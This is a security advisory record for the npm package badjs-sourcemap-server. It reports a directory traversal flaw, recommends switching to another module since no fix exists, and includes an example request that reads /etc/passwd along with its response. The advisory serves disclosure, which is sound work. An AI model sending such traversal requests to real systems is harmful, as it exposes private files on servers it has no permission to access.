---
Publication-State: Active
Access: Public
Reviewers:
- Name: Liang Gong
  Associated-With-Project: false
  Compensation-Source: external
Domain: Security
Methodology:
- Code-Review
Issues-Identified: Not-Examined
Package-URLs:
- pkg:npm/badjs-sourcemap-server
Review-Date: '2017-06-05'
Scope: Implementation/Full
Schema-Version: '1.0'
SPDX-License-Identifier: CC-BY-4.0
---
### Summary
*Directory Traversal*<br><br>Because there is no fix for this module, we recommend using a different one.
### Details
`badjs-sourcemap-server` recieves files sent by `badjs-sourcemap`.  `badjs-sourcemap-server` is vulnerable to a directory traversal issue, giving an attacker access to the filesystem by placing "../" in the url.  Example request: ``` GET /../../../../../../etc/passwd HTTP/1.1 host:localhost ``` and response: ``` HTTP/1.1 200 OK Date: Wed, 17 May 2017 22:59:49 GMT Connection: keep-alive Transfer-Encoding: chunked  {content of /etc/passwd} ```
<br><br>• Affected Versions: <99.999.9999
<br>• Patched Versions: <0.0.0
### Methodology
This review was taken directly from the Security Advisories section of npm's official website.
### External References
['https://github.com/JacksonGL/NPM-Vuln-PoC/tree/master/directory-traversal/badjs-sourcemap-server)']
### Disclaimer
All security reviews are conducted on a "best-effort" basis against a software component at a point in time. We make no guarantee as to the quality or completeness of any review. If you believe any content is inaccurate, we encourage you to open an issue or submit a pull request with a correction or improvement.
### License
This text is released under at least the [Creative Commons Attribution 4.0 (CC-BY-4.0) license](https://creativecommons.org/licenses/by/4.0/legalcode.txt). Externally-referenced content may be licensed differently.
